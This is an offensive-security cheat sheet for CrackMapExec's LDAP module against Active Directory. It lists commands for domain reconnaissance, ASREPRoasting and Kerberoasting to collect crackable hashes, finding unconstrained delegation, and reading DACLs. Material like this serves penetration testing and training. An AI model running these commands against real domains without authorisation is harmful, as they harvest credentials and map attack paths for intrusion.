# cme

% cme-ldap, crackmapexec, windows, Active directory
#plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 


## LDAP connection
edit /etc/hosts
```bash
cme ldap <ip> -u <user> -p <password> -d <domain> --no-smb
```

## LDAP Machine Account Quota
```bash
cme ldap <ip> -u <user> -p <password> -d <domain> --no-smb -M MAQ
```

## ASREPRoast enum without authentication
User can be a wordlist too (user.txt)
Hashcat format  -m 18200 
```bash
cme ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_name>
```

## ASREPRoast enum with authentication
Hashcat format  -m 18200 
```bash
cme ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_name>
```

## Kerberoasting
Hashcat format  -m 13100
```bash
cme ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_name>
```

## Unconstrained delegation
List of all computers et users with the flag TRUSTED_FOR_DELEGATION
```bash
cme ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
```


# read DACLs of an account
```bash
cme ldap <dc_name> -k --kdcHost <dc_name> -M daclread -o TARGET=<user> ACTION=read
```


# read DACLs of an principal has over a target
```bash
cme ldap <dc_name> -k --kdcHost <dc_name> -M daclread -o TARGET=<target_user> -o PRINCIPAL=<user> ACTION=read
```